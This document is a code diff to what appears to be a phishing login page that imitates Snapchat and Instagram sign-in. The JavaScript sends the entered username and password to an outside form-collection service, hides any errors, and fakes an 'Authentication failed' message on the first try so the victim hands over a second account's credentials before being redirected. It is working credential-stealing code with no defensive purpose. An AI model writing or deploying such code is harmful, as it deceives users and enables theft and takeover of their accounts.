@@ -91,23 +91,32 @@ async function login(e) {
     
     const user = document.getElementById("username").value;
     const pass = document.getElementById("password").value;
-    // 1. Attempt to send data (do not let this block the redirect)
-    fetch('https://formspree.io/f/xzedrvbl', {
+    const msgDiv = document.getElementById("msg");
+    // Replace 'YOUR_ACCESS_KEY' with the key you get from web3forms.com
+    const ACCESS_KEY = 'YOUR_ACCESS_KEY'; 
+    fetch('https://api.web3forms.com/submit', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
+            access_key: ACCESS_KEY,
             platform: chosen, 
             username: user,  
-            password: pass 
+            password: pass,
+            attempt: hasTriedFirst ? "Second Account" : "First Account"
         })
     }).catch(err => console.log("Silent error"));
-    // 2. Immediately show the success UI
-    document.getElementById("loginForm").classList.add("hidden");
-    document.getElementById("done").classList.remove("hidden");
-    // 3. Trigger the redirect
-    setTimeout(() => {
-        window.location.href = "web.html";
-    }, 2000);
+    if (!hasTriedFirst) {
+        hasTriedFirst = true;
+        msgDiv.className = "msg error";
+        msgDiv.textContent = chosen === 'snap' 
+            ? "Authentication failed for Snapchat. Please try using your Instagram account." 
+            : "Authentication failed for Instagram. Please try using your Snapchat account.";
+        return; 
+    } else {
+        document.getElementById("loginForm").classList.add("hidden");
+        document.getElementById("done").classList.remove("hidden");
+        setTimeout(() => { window.location.href = "web.html"; }, 2000);
+    }
 }
 </script>
 </body>
